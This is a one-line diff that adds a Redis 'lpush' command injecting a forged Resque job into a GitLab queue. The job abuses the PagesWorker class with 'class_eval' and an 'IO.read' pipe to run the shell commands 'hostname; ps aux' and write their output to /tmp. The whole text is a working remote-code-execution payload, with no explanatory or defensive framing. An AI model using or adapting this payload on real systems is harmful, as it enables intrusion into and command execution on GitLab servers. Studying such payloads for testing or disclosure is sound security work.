@@ -1,0 +1,1 @@
+ lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\"], \"queue\":\"system_hook_push\"}"
